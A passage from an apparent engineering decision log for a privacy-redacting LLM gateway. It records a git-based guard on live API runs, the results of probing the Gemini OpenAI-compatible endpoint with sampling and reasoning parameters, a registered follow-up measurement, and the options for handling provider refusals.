   replaced the same day, before any further live call, for four reasons.
   (a) It shows only the newest commit, so a plan commit with later commits
   on top is not visible in it. (b) It cannot see the failure that actually
   happened: with the plan staged but not committed, it shows an older
   commit, and nothing in its output says that the plan on disk differs.
   (c) It is still a step someone has to remember, which is what failed.
   (d) Whether it could run depended on how it was typed: in the session
   that recorded it, `git log` and `git status` written as `git -C <dir> …`
   were denied by the project's permission settings (`Bash(git -C:*)`).
   The check as written, without `-C`, matches no deny pattern, but a check
   that the permission layer can block by spelling is not a check. The
   guard runs inside the measuring script, under the user's own shell.
   ADR-042 records the deny list's limits and the exact commands refused.

   **The guard** (`scripts/live-run-guard.ts`, called by
   `scripts/measure-gemini.ts`). The two modes that reach Google
   (`--list-models` and the calls) refuse to start, exit 1 and send
   nothing, unless:
   - `git status --porcelain=v1 -z --untracked-files=all` reports **no
     change anywhere in the working tree**: nothing staged, nothing
     unstaged, nothing untracked, `docs/decisions.md` included (a staged
     but uncommitted plan, Attempt 4's case, is refused and named as such).
     Ignored files (`.env`, `models/`, `.machine-samples/`) do not count;
   - HEAD names a commit (no unborn repository, not outside one, git
     available; any failure refuses).

   It prints `working tree clean at <commit>`, and the attempt's
   `attempt.json` gains a `head` field with that commit, so every later
   recording names the commit it ran from, and
   `git show <head>:docs/decisions.md` shows exactly which plan existed.
   `--headers` sends nothing to Google and is not guarded. **The request is
   unchanged:** the guard runs before any request is built, and no line
   that builds or sends one changed, so later recordings stay comparable
   with Attempt 4's. `attempt.json` is local metadata and gains a field.

   **Why the whole tree, and not only `docs/decisions.md`.** The bytes sent
   are decided by `measure-gemini.ts` and `src/`; a run from uncommitted
   code could not be reproduced from the history. An earlier attempt's
   recordings left uncommitted would also go into one commit with the next
   plan, the same mixing Attempt 4 produced. The cost: unrelated work in
   progress has to be committed or set aside before a live run, and live
   runs are rare.

   **What it does not do.** It does not tie a run to a particular plan: a
   clean tree shows that everything on disk is committed, not that this
   run's plan was written. A required `--plan <heading>` matched against
   the committed file was considered and not built, because any existing
   heading would satisfy it. It also cannot stop the history being
   rewritten after a run (a plan amended into an earlier commit). Evidence
   a local rewrite cannot change would need the plan pushed before the run
   and checked against the remote-tracking branch; that changes how live
   runs are done and is left to the user. (The user asked for it on
   2026-10-10: see the amendment below, and what it does not prove.)

   **Shown to fire:** `test/unit/scripts/live-run-guard.test.ts`, 20
   tests. With real git in throwaway repositories (no test makes a commit),
   it refuses a staged `docs/decisions.md`, one staged and edited again, an
   untracked one, a repository with no commit, and a directory outside any
   repository; with git's answers fixed, the remaining forms (unstaged
   only, ten paths listed and the rest counted, a HEAD that is not a commit
   id). The script itself is run with no key, so no outcome of the test
   can reach the network, from a throwaway repository: the script and the
   guard copied byte for byte at test time, `src` linked to the real one,
   `docs/decisions.md` staged and not committed. It must print the refusal,
   never reach the key check, and make no attempt folder. 11 of 11
   mutations caught (9 in the guard, 2 removing the script's call or its
   exit). **Corrected 2026-10-08:** the first version of that test ran the
   script in this repository and took one branch on a dirty tree and the
   other on a clean one, so on a clean checkout (CI) it could not fail. It
   now runs in its own repository, and the 11 mutations were run again
   against it: all caught, with W1 and W2 failing it alone. **Note
   2026-10-10:** that list was not kept (ADR-043), so the counts above are
   attested, not reproducible. A rebuilt list, not the same one, is tracked
   as `scripts/mutations/live-run-guard.ts` (T1–T9, S1, S2): 11 of 11
   caught; the script-level test catches T1, T3, T5, S1 and S2, and is the
   only one to catch S1 and S2 (testing guide, "Tracked mutation lists").

   This applies to every remaining live run of Phase 7, the probe run
   included, and to any later live measurement made with this script.

   **Amendment 2026-10-10: the push requirement.** A clean tree shows that
   the plan was committed before the run, but only by a local commit, and a
   local commit can be amended or rebased afterwards: the plan's precedence
   was still self-attested. A commit already on GitHub has a record outside
   this machine. So the guard now has a third condition, checked after the
   first two:
   - **HEAD is an ancestor of the last known origin/main.** That is
     exactly what is checked, and no more: `git rev-parse` reads
     `refs/remotes/origin/main` **in the local repository**, and
     `git merge-base --is-ancestor <HEAD> <that commit>` must exit 0
     (HEAD equal to it counts). Exit 1 refuses as "not an ancestor",
     naming both commits and saying to push, or to run `git fetch origin`
     if the commit is already pushed. A missing ref, a value that is not a
     commit id, or any other exit status refuses with its own reason.
     Exit statuses measured on this repository, read-only, on 2026-10-10:
     0 for a parent, 1 for a child, 0 for the same commit, 128 for a ref
     that does not resolve; `rev-parse --verify --quiet` exits 1 for a
     missing ref.

   **What the check proves, and what it does not.** It compares HEAD with
   a local ref, not with GitHub. That ref changes only when this repository
   pushes or fetches; between those it is stale, and it can be set by hand
   (`git update-ref`) without anything reaching GitHub. A stale ref mostly
   errs towards refusing (a pushed commit not yet fetched), but a ref set
   by hand, or one last fetched before a force-push removed the commit from
   GitHub, would let a commit through that GitHub does not hold. So **the check is a tripwire
   against forgetting to push, not evidence that the push happened. The
   evidence is GitHub's record**: the commit on GitHub, and a push time
   GitHub itself recorded before the run's `startedAt` (the repository's
   activity view, or the CI run that push started). A commit's own date is
   not evidence: it is set on this machine. `attempt.json` gains
   `originMain`, the commit the check compared with, so a reader can find
   the push on GitHub; it is the check's input, not proof.

   **What it costs.** Every live run needs a push first, made by the user
   (rule 1). At the time of writing, the local origin/main is `e9efceb`,
   behind HEAD: a live run from this tree would be refused.

   **How it is tested, and the gap.** With git's answers fixed (5 tests):
   refused when HEAD is not an ancestor, when there is no origin/main ref,
   when the ref is not a commit id, and when git cannot compare (without
   being called unpushed); an uncommitted change is reported first. The
   fake answers the ancestry question only when asked about exactly
   `refs/remotes/origin/main`, HEAD first, so a wrong ref or a swapped pair
   fails the passing test. These tests depend on nothing in this
   repository. **Real git is not exercised for this condition, and neither
   is the script's success path:** a throwaway repository only gets past
   the first two conditions with a commit in it, and no test makes one,
   since rule 1 forbids any script that creates commits. The existing
   real-git and script-level tests refuse before the push check. Mutations
   (`scripts/mutations/live-run-guard.ts`, P1–P8): 7 of 8 caught; **P8
   survives**, as predicted in the list before the run: dropping the
   `originMain` record is reached only on that success path. A fixture
   repository made by the user, which tests could clone without
   committing, would close the gap; not built.

   **Gap closed, 2026-10-10 (after ADR-044 was committed and pushed).**
   Real git now meets the push check, in throwaway repositories under the
   system's temporary directory that hold real, empty commits (ADR-044's
   conditions; how each is met is in the testing guide). Six tests: refused
   when HEAD is one commit ahead of origin/main, and when a pushed commit
   was amended afterwards (the case the requirement exists for); allowed
   when HEAD equals origin/main and when it is behind it; refused with no
   origin/main ref; and the conditions themselves checked (no remote, no
   identity in any config, the synthetic author on the commit). A second
   script-level test runs `measure-gemini.ts` from a clean, pushed throwaway
   repository: the guard lets it through, it prints both commits, and it
   stops at the key check (no key is given), so no outcome reaches the
   network. **P8 no longer survives:** that test reaches the success path,
   and P8 fails it (1 of 32). The whole tracked list, 21 mutations with two
   new ones (P9: the exit code read from the error's `code` instead of
   `status`, the assumption the fake made and real git now checks; S3: the
   script not recording HEAD), was run again: **21 of 21 caught**.

**Observations from Attempt 4: Google-specific fields (no handling
change).** Gemini returned a field that is not in OpenAI's specification,
`extra_content.google.thought_signature` (an opaque base64 string):

- `s1` (not streamed): on `choices[0].message.extra_content`;
- `s2` (streamed): on chunk 4's `delta.extra_content`, the chunk that
  carries `finish_reason: "stop"` (Attempt 4's record above leaves this one
  out);
- `s3` (streamed with usage): on chunk 4's `delta.extra_content`, also the
  finish chunk.

From reading the code (not
tested against these recordings): the adapter's response and chunk schemas
in `src/providers/openai-compatible.ts` are plain `z.object`, which drops
unknown keys, so today the field is discarded without a trace. It is not
passed to the client, not logged and not counted. **Whether the gateway
should strip, pass through or record these fields is an open Phase 7c
decision.** Options go to the user under rule 6. Nothing is decided here,
and nothing in the code changed.

### 12. The probe run: what a failed probe can mean (recorded 2026-10-10, before any probe)

Written before any probe is sent; the guard (section 11 item 4) refuses
the probe run until this is committed. Established in the session of
2026-10-08 and not written down then; checked again on 2026-10-10 by
reading the code and by running every probe body through the request path
on this machine. No call to Google was made for it.

1. **The gateway's schema accepts every probe parameter and passes it on.**
   The probe bodies in `scripts/measure-gemini.ts` (`p01`–`p15`:
   `temperature` 0, `top_p` 0.5, `seed` 42, `frequency_penalty` 0.5,
   `presence_penalty` 0.5, `stop` with one newline, `max_tokens` 16,
   `response_format` `json_object`, and `reasoning_effort` `none`,
   `minimal`, `low`, `medium`, `high`, `xhigh`, `max`) were each run
   through `parseChatRequest` and `redactRequest`, as the script does: 15
   of 15 accepted, and each parameter is in the request handed to the
   adapter (in `options`, or `stop`). So `src/gateway/schema.ts` refuses
   no probe before it is sent. Section 10 trims `reasoning_effort` to three
   values (11 probes); the script still lists all 15. The finding covers
   both lists.
2. **No probe streams.** No probe sets `stream`, so every probe goes
   through the adapter's `complete()`, never `stream()`. The check that
   failed `s3` (usage at most once and only after the finish, in
   `streamEvents`, `src/providers/openai-compatible.ts`) is reached only by
   `stream()`. No probe can fail on it, so Gemini's usage on every chunk
   cannot show up again as a probe result.
3. **What a failed probe means: narrower than "the upstream rejected the
   parameter".** That statement, as first made, is true of one kind of
   failure only:
   - **HTTP 400:** Google refused the request. Each probe is `s1`'s
     request with one parameter added, and `s1` was accepted on this model
     (Attempt 4), so a 400 is read as Google rejecting that parameter or
     its value. The response body is kept, so the reading is checked
     against what Google wrote, not assumed.
   - **HTTP 200 and the adapter `failed` (`bad_response`):** Google
     accepted the parameter and the adapter rejected the answer.
     `complete()` requires exactly one choice, `message.content` a string,
     and `finish_reason` one of `stop`, `length`, `content_filter`. A probe
     can change exactly these: for example, if thinking uses up
     `max_tokens` 16, the answer may have no text (a possibility, not
     measured). Such a result is a finding about the adapter, recorded as
     one, and never counted as a rejected parameter.
   - **No answer, or an answer not finished within 120 s** (the adapter
     `failed` with `timeout` or `unavailable`; the recorded HTTP status is
     200 or missing):
     neither a rejection nor a finding about the answer's shape. A long
     `reasoning_effort` (`xhigh`, `max`) could plausibly cause it. The
     script records it and goes on to the next probe.
   - **Any other status, or a 429:** the run stops (sections 10 and 11).

   The recording tells these apart: each call's HTTP status is written
   separately from the adapter's outcome (`ok`, or `failed` with its
   failure kind and status).

4. Section 10's limit stands: one call per probe shows whether a parameter
   is accepted, not whether it takes effect.

### 13. Attempt 5: the probe run (2026-10-09, 21:18 UTC)

Run exactly as registered in section 10's amendment of 2026-10-10 (the
command there, `--calls p01` to `p15`), from commit `4097862`, which was
also the local origin/main (`attempt.json` records both). Model
`gemini-3.5-flash-lite`. The date is UTC: on this machine's clock it was
2026-10-10. Recordings: `test/fixtures/gemini-7b/attempt-5/` (31 files).
15 calls, 15 s apart; all 15 answered; no stop rule fired; nothing retried.

**Results.** Latency is the whole call, request sent to body read.

| Probe | Sent                                       | HTTP    | Latency  | Outcome (section 12, item 3)                               |
| ----- | ------------------------------------------ | ------- | -------- | ---------------------------------------------------------- |
| p01   | `temperature: 0`                           | 200     | 1,582 ms | accepted, adapter `ok`                                     |
| p02   | `top_p: 0.5`                               | 200     | 887 ms   | accepted, adapter `ok`                                     |
| p03   | `seed: 42`                                 | **400** | 522 ms   | Google rejected the parameter                              |
| p04   | `frequency_penalty: 0.5`                   | **400** | 566 ms   | Google rejected the parameter                              |
| p05   | `presence_penalty: 0.5`                    | **400** | 857 ms   | Google rejected the parameter                              |
| p06   | `stop: ["\n"]`                             | 200     | 1,046 ms | accepted, adapter `ok`                                     |
| p07   | `max_tokens: 16`                           | 200     | 970 ms   | accepted, adapter `ok`, `finish_reason` `length`           |
| p08   | `response_format: {"type": "json_object"}` | 200     | 975 ms   | accepted, adapter `ok` (the answer is valid JSON)          |
| p09   | `reasoning_effort: "none"`                 | **400** | 623 ms   | Google rejected the request (attributed by elimination, 7) |
| p10   | `reasoning_effort: "minimal"`              | 200     | 1,106 ms | accepted, adapter `ok`                                     |
| p11   | `reasoning_effort: "low"`                  | 200     | 1,076 ms | accepted, adapter `ok`                                     |
| p12   | `reasoning_effort: "medium"`               | 200     | 1,379 ms | accepted, adapter `ok`                                     |
| p13   | `reasoning_effort: "high"`                 | 200     | 1,583 ms | accepted, adapter `ok`                                     |
| p14   | `reasoning_effort: "xhigh"`                | **400** | 354 ms   | Google rejected the parameter                              |
| p15   | `reasoning_effort: "max"`                  | **400** | 350 ms   | Google rejected the parameter                              |

Of section 12's three outcomes: **6 rejected by Google, 0 answered with a
200 that `complete()` rejected, 0 timed out.** The second and third
outcomes did not occur in this run. Every 200 kept both placeholders
except p07 (below); none carried a long run of digits; no `spii` or other
block finish appeared. Google's error bodies:

- p03: `Invalid JSON payload received. Unknown name "seed": Cannot find field.`
- p04: `Invalid JSON payload received. Unknown name "frequency_penalty": Cannot find field.`
- p05: `Penalty is not enabled for this model`
- p09: `Request contains an invalid argument.`
- p14: `Invalid reasoning_effort: xhigh. Valid values are: high, low, medium, minimal, none`
- p15: `Invalid reasoning_effort: max. Valid values are: high, low, medium, minimal, none`

Each is again a JSON array (as in Attempt 1), all `INVALID_ARGUMENT`.

**1. The prediction scorecard. 12 of 15 overall, but 2 of 5 on p02–p06,
the five fields Gemini does not document, which is what the run was for.**
All three misses went the same way: **predicted accepted for a field Gemini
does not document, and it was rejected.** Every high-confidence prediction
was on a documented field or value; those hits were the easy part.

| Probe   | Predicted (confidence)                      | Happened                             | Result                          |
| ------- | ------------------------------------------- | ------------------------------------ | ------------------------------- |
| p01     | accepted (high)                             | accepted                             | hit                             |
| p02     | accepted (medium)                           | accepted                             | hit                             |
| p03     | accepted (medium)                           | rejected: unknown field              | **miss**                        |
| p04     | accepted (low)                              | rejected: unknown field              | **miss**                        |
| p05     | accepted (low)                              | rejected: not enabled for this model | **miss**                        |
| p06     | accepted, `stop` (medium)                   | accepted, `stop`                     | hit                             |
| p07     | accepted, `length`, cut-short text (medium) | exactly that                         | hit                             |
| p08     | accepted (high)                             | accepted                             | hit                             |
| p09     | rejected (low)                              | rejected                             | hit                             |
| p10     | accepted (medium)                           | accepted                             | hit                             |
| p11     | accepted (high)                             | accepted                             | hit                             |
| p12     | accepted (high)                             | accepted                             | hit                             |
| p13     | accepted within 120 s (medium)              | accepted in 1.6 s                    | hit                             |
| p14     | rejected (medium)                           | rejected                             | hit                             |
| p15     | rejected (medium)                           | rejected                             | hit                             |
| **sum** | 12 accepted, 3 rejected                     | **9 accepted, 6 rejected**           | **12 of 15; 2 of 5 on p02–p06** |

The three predicted rejections (p09, p14, p15) were all right.

**2. The penalties, in full.** The plan recorded a memory, marked as not
checked, that some Gemini models answer penalties with a 400 saying they
are not enabled for the model. The prediction went against that memory
(accepted, low confidence). **The memory was right and the prediction was
wrong, for both penalties.** For `presence_penalty` the memory was right
word for word: `Penalty is not enabled for this model`. For
`frequency_penalty` it was right about the failure and wrong about the
layer: the compatibility layer does not know the field at all
(`Unknown name "frequency_penalty"`), before any model is involved.

**3. Hidden thinking tokens at `medium` and `high`.** In `usage`,
`total_tokens` equals `prompt_tokens + completion_tokens` on every
accepted answer except two: p12 (`medium`) 238 against 29 + 21 = 50,
**+188**; p13 (`high`) 243 against 29 + 19 = 48, **+195**. `usage` has no
field that counts reasoning tokens (no `completion_tokens_details`); the
difference shows only in the total. **Consequence:** a client that costs a
call from `completion_tokens` undercounts these calls, by about 190 tokens
each here. Nothing in the gateway reads or changes `usage` for this.

**4. Hypothesis, not a finding (n = 2): `thought_signature` length and hidden
thinking.** `extra_content.google.thought_signature` was present on all 9
accepted answers. It is 132 characters on 7 of them and longer on two:
p12 `medium` (952) and p13 `high` (1,004), the same two calls with hidden
thinking tokens. **Two calls. No cause is asserted**, and nothing here
shows the signature's length depends on thinking. Recorded as an
observation; how the gateway treats the field is still the open 7c
decision (Attempt 4 observations above). Nothing in the code changed.

**5. Open and unexplained: p07.** `max_tokens: 16`, `finish_reason`
`length`, **12** completion tokens, and **no hidden tokens on that call**
(41 = 29 + 12). The answer is 50 characters, keeps `[CARD_1]`, and ends
before the email placeholder (not inside one). Why a 16-token limit ended
at 12 completion tokens is **not explained**, and this record leaves it so.

**6. Accepted is not the same as working.** p02's `top_p` and p06's `stop`
string were accepted, but nothing measured whether either took effect:
p06's answer contained no line feed, so the stop string was never reached,
and one call cannot show a sampling change (section 10's limit). **"Accepted"
here means "not refused", never "works".** The same holds for every
accepted probe. The only evidence of an effect: p07 ended with `length`;
p08's answer was valid JSON although the prompt asked for a sentence; and
p12 and p13 (`medium`, `high`) carried hidden thinking tokens where p10 and
p11 (`minimal`, `low`) did not. None of these was a controlled comparison.

**7. `none`: Google's messages contradict each other.** p09 was refused
with `Request contains an invalid argument.`, which names nothing. p14 and
p15's messages list the valid values as `high, low, medium, minimal, none`,
including `none`. Attributing p09's failure to `reasoning_effort: "none"`
rests on **elimination**: the request was p01's apart from that one field,
minutes apart, and p01 was accepted. It fits Gemini's documentation
("cannot be turned off for … 3 models", section 4), but Google's message
does not confirm it.

**8. Budget, per model, not summed across models.**

- **`gemini-3.5-flash-lite`: 18 calls in all**: 3 in Attempt 4
  (2026-10-07) and 15 in this run, all 15 on one Pacific day (2026-10-09).
- Other models, unchanged and not added in: `qwen3:8b` 1 (404, Attempt 1),
  `gemini-2.5-flash` 2 (404, Attempt 3), and 1 model-list call (Attempt 2),
  which names no model.
- Whether a 404 consumes allowance is still unknown.

**The allowance check.** Section 11 item 9 required the allowance figures
to be confirmed on AI Studio before the run. That check was not performed
before the run. The figures were confirmed by the user AFTER it, on
2026-10-10, and match what was registered: 15 RPM, 250K TPM, 500 RPD for
`gemini-3.5-flash-lite`. The run stayed far inside any plausible allowance,
so nothing was at risk, but a registered pre-run step was skipped for the
second time in this phase.

**Two observations from the same AI Studio page (read by the user on
2026-10-10, about 20 minutes after the run); observations, not findings.**

- **(a) Peak requests per minute: 4 of 15.** The plan predicted at most 4
  calls a minute from `SPACING_MS` (section 10's amendment, item 6). The
  provider's own counter corroborates the spacing.
- **(b) Peak requests per day: 11 of 500** for the day the 15 probes ran:
  not 15, and not 18. **Unresolved**, with two candidate explanations: the
  counter may still have been catching up about 20 minutes after the run;
  or the six 400 responses may not count in full against the daily
  allowance. Of the 15 calls, 9 were answered with a 200 and 6 with a 400,
  and that is **weak evidence for the catching-up explanation**: an
  intermediate value is what a counter still updating looks like, while no
  simple counting rule produces 11 from 15 sent and 9 succeeded (every
  call gives 15, successes only 9, errors only 6). It is weak, and not
  enough to choose. Whether an error consumes allowance has been recorded as
  unknown since Attempt 3 (section 10, for its two 404s); this is the first
  evidence bearing on it, and it does not settle it. Re-reading the same
  page on a later day, once the counter has settled, remains what would
  settle it.

**Open decision (rule 6, nothing decided here).** Six of the fifteen
parameters or values the gateway accepts and forwards are refused by this
model, and a client sending any of them gets an opaque 502
`provider_error` today. They fail at three layers: unknown field (`seed`,
`frequency_penalty`), not enabled for this model (`presence_penalty`),
invalid value (`xhigh`, `max`, and `none` without an explanation). Options
went to the user on 2026-10-10. Not measured: whether the same fields fail
at other values (a client SDK sending `frequency_penalty: 0`, which the
gateway forwards, while it drops `null`), and on any other Gemini model.

**Decision (the user, 2026-10-10): option 3 for the measured refusals, with
4b as the global fallback.** The options as put:

1. leave the 502 and document it (global);
2. strip the refused parameters before sending (per provider, in fact per
   model: `presence_penalty` is "not enabled for this model");
3. reject them at the gateway with a clear 4xx naming the field in `param`,
   before anything is sent (per provider and model);
4. pass them through and turn Google's 400 into an informative error by
   reading its body (the mechanism global, the parsing per provider);
   4b: map any provider 400 to a 4xx without reading the body (global);
5. remove them from the allowlist for every provider (global).

The user's reasoning:

- **Options 2 and 3 both go stale if Google changes what it accepts, but
  they fail in opposite directions.** A stale reject fails loudly: a client
  gets a 400 for something that now works, and tells us. A stale strip
  fails silently: the client gets a 200 and believes a parameter took
  effect. Silent wrongness is the one failure this project exists to avoid,
  so **option 2 is ruled out on principle, not on cost.**
- **Option 4 is ruled out** because the adapter deliberately never reads
  provider error bodies, since they can echo the prompt. Parsing them would
  route possibly-user-containing text through new code in a privacy
  gateway. That is a design violation, not a maintenance cost. 4b reads
  nothing.
- **Option 5 is ruled out** because it breaks Ollama, where these
  parameters are forwarded on the strength of Ollama's own source.

**Option 1's cost, as put to the user, now checked.** The cost argument
assumed that the official OpenAI SDKs retry a 5xx twice by default; when
put to the user it was marked "as far as I know". **Verified 2026-10-10**
against the README of `openai-node` (branch `master`) and of
`openai-python` (branch `main`): "Certain errors are automatically retried
2 times by default, with a short exponential backoff. Connection errors …,
408 Request Timeout, 409 Conflict, 429 Rate Limit, and >=500 Internal
errors are all retried by default" (Python's wording; Node's is the same in
substance), configurable with `maxRetries` / `max_retries`. So with default
settings, the gateway's 502 for a refused parameter is retried twice: up to
three provider calls for one refused request. A 400 is not in the list, so
options 3 and 4b also stop those retries. Limits of the check: the pages
were read through a fetch tool that passes them through a summarising model
(the quoted text came back marked verbatim); READMEs can change; no other
SDK or client library was checked.

**What it means, before any code.** For a field or value measured as
refused by the configured provider and model, the gateway answers a 400 in
OpenAI's error shape, naming the field in `param`, and sends nothing. For
any 400 from a provider, measured or not, the gateway answers a 4xx with a
fixed message and never reads the body (4b), instead of today's 502. The
exact codes, messages and how profiles are keyed (provider or model) are
settled when it is built. **Nothing is built until section 14's
measurement has run**: option 3 must not reject a value Google accepts.

### 14. Registration: the zero-value measurement (2026-10-10, before any call)

Written on 2026-10-10. **None of the three calls below has been made.** This
is committed and pushed before the run; the live-run guard refuses to
start otherwise (section 11 item 4), and the commit is the record.

**Why.** Option 3 (section 13's decision) will reject a refused field
before sending. Attempt 5 refused `seed` at 42 and both penalties at 0.5,
but the gateway forwards `0` (it drops only `null`), and a client or
library may send a field explicitly at its neutral value. **Option 3 must
not reject a value Google would have accepted.** So each of the three
refused fields is sent once at 0.

**The calls.** Model `gemini-3.5-flash-lite`. Each is Attempt 4's `s1`
request (placeholders only, `stream: false`) with exactly one parameter
added, through the real pipeline; checked locally on 2026-10-10 that the
gateway accepts all three and forwards the 0 unchanged. Added to
`scripts/measure-gemini.ts` as `p16` to `p18`:

```powershell
npx tsx --env-file=.env scripts/measure-gemini.ts --model gemini-3.5-flash-lite --out test/fixtures/gemini-7b --calls p16,p17,p18
```

**Predictions, written before the run (the assistant's, reviewed by the
user).**

| Probe | Sent                   | Prediction                        | Confidence | Why                                                                                                                                                                                                                                                                                                                                                                                                                            |
| ----- | ---------------------- | --------------------------------- | ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| p16   | `seed: 0`              | **rejected (400), unknown field** | high       | Attempt 5 failed on the **field name** (`Unknown name "seed": Cannot find field.`): the request parser does not know the key, so a different value should not help.                                                                                                                                                                                                                                                            |
| p17   | `frequency_penalty: 0` | **rejected (400), unknown field** | high       | The same: failed on the field name, not the value.                                                                                                                                                                                                                                                                                                                                                                             |
| p18   | `presence_penalty: 0`  | accepted (200, adapter `ok`)      | low        | Attempt 5 failed on the **feature being disabled** (`Penalty is not enabled for this model`), not on the field; the field is known, and 0 is the neutral value, which a check on the value would let through. Against: a check on whether the field is present refuses it at any value. Noted for the reader: all three misses in Attempt 5 were "accepted" predictions on an uncertain field, the same direction as this one. |

**What each outcome means for option 3** (registered now, so the result
cannot choose it):

- `seed` or `frequency_penalty` refused at 0: option 3 refuses that field
  at any value, for this provider and model.
- `presence_penalty` accepted at 0: option 3 refuses it only at a value
  other than 0 and forwards 0 unchanged (passed through, not stripped).
  Refused at 0: refused at any value.
- Any field accepted at 0 where predicted otherwise: as for
  `presence_penalty`, refused only away from 0.
- A 200 that `complete()` rejects, or no answer within 120 s (section 12):
  recorded; no conclusion for that field, and option 3 for it waits.

**Outcomes, stop rules and spacing** are section 12's and section 10's
amendment (items 4 to 6), unchanged: a 400 is the probe's result and the
run goes on; a 403, 404, 429 or any other status stops it at once; 15 s
between calls (the run takes at least 30 s).

**Budget, per model.** `gemini-3.5-flash-lite`: 18 calls so far (section
13, item 8); this run at most 3, so at most 21. Allowance 15 RPM, 250K TPM,
500 RPD, as confirmed by the user on 2026-10-10 (section 13, item 8).

**Before the run** (section 11 item 9's step was skipped twice in this
phase, so it is written out here):

1. The user confirms the allowance on AI Studio before the run, and the
   report says when.
2. **Not on the same day as Attempt 5, by any likely boundary.** Attempt 5 ran on
   2026-10-09, Pacific time, and section 13's observation (b) depends on
   that day's settled counter. Three more calls that day would add to it
   and leave (b) unresolvable from it. So the run starts **no earlier than
   2026-10-10 18:30 UTC (2026-10-11 00:00 IST)**, after the user has
   re-read the 2026-10-09 figure on AI Studio, which also settles (b) or
   narrows it. That start is on a later day than Attempt 5's
   (2026-10-09 21:18 UTC) whichever boundary the counter uses: Pacific
   (midnight is 07:00 UTC, or 08:00 under standard time), UTC, or this
   machine's zone, IST, in which Attempt 5 fell on 2026-10-10 at 02:48. The
   account's own time zone on AI Studio is not known; IST is assumed from
   this machine.

   **Amended 2026-10-10, before any of the three calls.** The version
   committed and pushed in `f0e6693` said "no earlier than 2026-10-10 00:00
   Pacific (07:00 UTC, 12:30 IST)". Checking the Pacific reset (below)
   showed that start would share Attempt 5's day if the counter groups by
   IST. The new start is later, so the amendment only narrows when the run
   may happen; no time it now allows was excluded before.

   **The Pacific day, checked.** This rule depends on Google's daily
   counter resetting at midnight Pacific. **Verified 2026-10-10** against
   Gemini's rate-limits page (`ai.google.dev/gemini-api/docs/rate-limits`,
   "Last updated 2026-10-09 UTC"): "Requests per day (RPD) quotas reset at
   midnight Pacific time." It names no other daily reset. Section 4 had
   recorded the same from the version read on 2026-10-07. Limits of the
   check:
   - The page was read through a fetch tool that passes it through a
     summarising model; the sentence came back marked verbatim.
   - **The page speaks of the quota, not of AI Studio's usage display.**
     Observation (b) reads the peak-RPD figure on AI Studio, and nothing
     read here says that display groups requests into the same Pacific
     day. A midnight-Pacific start alone would not separate the two days if
     the display groups by the account's time zone and that zone is IST;
     the start above is chosen to hold under Pacific, UTC and IST, but a
     display grouped by some other zone is not covered.
   - The page does not say whether "Pacific time" follows daylight saving.
     Pacific Daylight Time (UTC−7) is in force on 2026-10-10 under the US
     rule (it ends on the first Sunday of November); that rule is general
     knowledge, not from Google's page. Under either reading, midnight
     Pacific (07:00 or 08:00 UTC) is before the 18:30 UTC start.
   - Pages change; this is what it said on 2026-10-10.

### 15. Phase 7c: the three deferred decisions (options, 2026-10-10; waits for the user)

Written on 2026-10-10. **Nothing here is decided, and no call to Google was
made for it.** These are the three decisions deferred in sections 6, 9 and
11 until 7b had measured. Section 14's three zero-value calls have not run
(there is no `attempt-6`), but none of these decisions depends on them.

Each option is checked against the three principles behind section 13's
decision:

- **(S) Silent wrongness is the worst outcome.** A 200 that lets a client
  believe something happened when it did not is worse than a loud failure.
- **(B) The adapter never reads provider error bodies**, because they can
  echo the prompt.
- **(O) A client that switched its base URL expects OpenAI-shaped
  behaviour.**

For each decision below, the text says where each principle fits and where
it does not. "Global" means one behaviour for every provider; "per
provider" or "per model" means a profile entry (section 6), filled only
from a measurement.

#### Decision 1: a refusal or null content from the provider

**What happens today, stated plainly.** `complete()` requires
`message.content` to be a string, so a non-streamed answer with
`content: null` and `refusal` set fails as `bad_response`. The client gets
a **502 `provider_bad_response`, "the provider returned an unusable
response"**: the same code and message as for a provider sending garbage. A
provider's legitimate refusal is a valid response, not a failure. Today it
reaches the client as a gateway error, and the client cannot tell "the
model declined" from "the gateway or provider broke". The official OpenAI
SDKs retry a 5xx twice by default (section 13), so one refusal costs up to
three provider calls, and the model will probably refuse each one again.

**Worse, found while writing this (bug-log 70):** the other two refusal
shapes are not loud at all. A streamed refusal (`delta.refusal` chunks, no
`content`, then `finish_reason: "stop"`) and a non-streamed `content: ""`
with `refusal` set both pass the adapter as an **empty answer that finished
normally**. The plain `z.object` schemas drop `refusal` as an unknown key.
This was run against the real adapter from a scratch script with a local
server, not a provider. The streamed case becomes a 200 stream with no
text. That is (S)'s worst case, and today it applies to streams.
Whichever option is chosen, it closes this.

**What a refusal's text is.** It is model output on the redacted prompt,
the same class of text as `content`: it can quote placeholders, never a
value the provider was not sent. Passing it to the client therefore means
restoring it, with the same restoration-safety rules as `content`. (B) does
not apply as written: this is a field of a 200 answer that the adapter
already parses, not an error body. Its reason (provider text can echo the
prompt) is the reason restoration exists, and restoration already handles
it for `content`.

| Option                                                                                                        | What the client sees                           | Can it tell "declined" from "broke"? | (S)                                                                                                                             | (O)                                                                                                                                  | Scope  |
| ------------------------------------------------------------------------------------------------------------- | ---------------------------------------------- | ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------ | ------ |
| **1a.** Keep the 502, and make the two silent shapes fail the same way                                        | 502 `provider_bad_response`                    | **No**                               | Loud, but untrue: it says the response was unusable                                                                             | No: OpenAI answers a refusal with a 200                                                                                              | Global |
| **1b.** The refusal text as `content`, restored, `finish_reason: "stop"`                                      | 200, a sentence of text                        | **Only by reading it**               | **Fails for machine clients**: a JSON-mode or extraction client parses the refusal as the answer and believes the task was done | Half: the 200 matches; the field does not, so a client that checks `refusal` finds `null`                                            | Global |
| **1c.** An empty assistant message (`content: ""`, `stop`)                                                    | 200, no text                                   | **No**                               | **Fails outright**: this is bug 70's behaviour made deliberate                                                                  | No                                                                                                                                   | Global |
| **1d.** A distinct error, e.g. `provider_refused`, fixed message, refusal text dropped                        | An error naming a refusal                      | **Yes**, by code                     | Loud and true                                                                                                                   | No: OpenAI gives a 200. Sub-choice: a 4xx (the SDKs do not retry it) or a 5xx with `x-should-retry: false` (the SDKs obey it; below) | Global |
| **1e.** OpenAI's own shape: `content: null`, `refusal` restored; in a stream, `delta.refusal` chunks restored | 200 with `refusal` set, exactly as from OpenAI | **Yes**, by the field, as on OpenAI  | Loud for any client that reads `refusal`; a client that reads only `content` gets `null`, as it would from OpenAI               | **Yes**                                                                                                                              | Global |

Costs beyond the table:

